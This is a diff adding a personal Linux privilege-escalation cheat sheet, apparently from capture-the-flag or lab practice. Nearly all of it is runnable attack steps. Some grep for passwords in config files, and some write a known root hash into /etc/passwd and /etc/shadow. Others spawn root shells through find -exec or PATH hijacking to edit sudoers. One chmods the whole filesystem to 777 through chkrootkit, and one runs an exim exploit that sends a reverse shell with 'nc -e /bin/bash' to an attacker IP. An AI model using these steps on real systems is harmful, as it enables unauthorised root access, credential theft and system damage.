@@ -1,0 +1,167 @@
+{{{ ###Order of Operations
+
+poke around (home dirs and whatnot)
+locate *.conf* | grep "www" | more
+ls /etc/apache2/sites-available
+ls /opt/
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+sudo -l <<<that is an L         <<<if it is a OpenBSD machine cat /etc/doas.conf
+sudo su
+su -l otherusercreds
+---------------------------------------------------------------------------------------------------------------------------------------------------------------
+Look for files with setuid bit set
+find / -perm -4000 2>/dev/null | xargs ls -lah              <<<<<<<<<<<<if a result has a version in the name GIVE IT A LOOKSEE!!
+find / -perm -u=s -type f 2>/dev/null | xargs ls -lah                              way to much shit returned > find / -perm -2000 2>/dev/null | xargs ls -lah
+ls -la through files and attempt to execute
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+uname -a (hit up in searchsploit)
+look for build version       cat /etc/*-release
+                                      cat /etc/issue
+                                      cat /proc/version
+                                      cat /etc/*{release,issue,edition,version}* 2> /dev/null
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+cat /etc/crontab
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+netstat -natup                  looking for possible backend machines OR an internal server
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+look in web config files for mysql credentials
+    wordpress = /var/www/wordpress/wp-config.php
+    drupal        = something /settings.php
+    nostromo    = /var/nostromo/conf
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+grep -ir user | grep -i pass
+grep -ir user | grep -i pwd
+grep -C2  -r root 2> /dev/null | grep pass
+grep -C2  -r username 2> /dev/null | grep pass
+find ./ -type f -writable                                           <<<<<<<<<<<<<<see what files and folders you can write to recursivley
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+wget --recursive --no-parent http://192.168.11.252:80/TFPE && chmod 777 *
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+linux-smart-enumerate
+cp /root/Desktop/Tools/PrivEsc/linux-smart-enumeration/lse.sh .
+./lse.sh -l1
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+linux-exploit-suggester
+
+dpkg -l > dpkg.txt
+or
+rpm -l > rpm.txt
+./les.sh --pkglist-file dpkg.txt --userspace-only
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+pspy
+SYNTAX UNTESTED
+pspy32 or pspy64
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+stings on custom binaries
+
+}}} ###
+{{{ ###One Offs
+Can you write to /etc/passwd?
+
+openssl passwd --help
+openssl passwd -1 coolhand
+$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40
+vi /etc/passwd
+root:$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40:0:0:root:/root:/bin/bash
+:wq!
+
+ssh root@10.10.10.29
+password: coolhand
+
+
+root:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+
+
+Can you write to /etc/shadow?
+
+openssl passwd -1 -salt root coolhand
+    $1$root$QLjiLXyqZyG8UZoetHo2t1
+add root: to the begining and :17764:0:99999:7::: to the end so it looks like this
+
+root:$1$root$QLjiLXyqZyG8UZoetHo2t1:17764:0:99999:7:::
+make this a line in /etc/shadow and boom!
+su root
+        
+        
+        
+If you are prompted for a password, its coolhand
+
+
+Can you run find as root?
+
+find /etc/shadow -exec cat {} +                    now you can read the shadow file!
+
+find /etc/shadow -exec bash \;                      you may be able to make a root shell with this or sh!
+find /etc/shadow -exec sh \;    
+
+
+chkrootkit 0.49 (check the README in /etc)
+
+searchsploit will tell you all the things
+in summary
+    go to /tmp
+    echo "chmod -R 777 /" > update
+    execute chkrootkit (whether it be a cron job or ran during the README)
+    Once it runs the whole file structure should be 777'd
+
+
+Can you run echo as root?
+
+echo os.system("/bin/bash")
+
+
+exim3 4.87
+
+exim4 --version shows version 4.87
+exploitdb takes us to https://www.exploit-db.com/exploits/46996
+run dos2unix against the code to "unwindowsify" it
+put 46996.sh on target box
+
+start nc listener
+/bin/bash 46996.sh -m netcat
+it will say to wait 5 seconds... and then you get to put in a command
+you put in nc -e /bin/bash 192.168.11.136 3234          (that is your kali IP)
+and boom!! root shell!
+
+
+sudo ht
+
+sudo /usr/local/bin/ht /etc/passwd
+f6 > text > f3 > down down select 
+comment out root
+root:$1$iQ6kkmiJ$1f7eqBvCAc5fhg76BcaL40:0:0:root:/root:/bin/bash
+f2 (to save)
+ctrl c
+cat /etc/passwd
+su -l root
+coolhand
+whoami
+    root!!
+
+
+PATH Variable
+
+script is opviously the binary for ls. It aslo has the SUID bit set to run as root.
+
+cd /tmp
+echo "echo  "user4 ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/user4'
+export PATH=/tmp:$PATH
+~/script (or ls)
+	now we are able to sudo without a password
+
+
+Screen
+
+Watch HTB Haircut video
+
+ran the find privs command and found that a vulnerable version of screen would be run as root
+found the exploit in searchsploit and downloaded it.
+compiled the code (on my debian 64 machine). The code between the EOF piecees. 
+I then moved the files over to the targer 
+chmod 777 41154.sh
+run 41154.sh ....and...BOOM. I should be root... but I am pretty sure I messed one of the /etc/xxx.so files. I am not restarting yeet.
+
+}}} ###
+
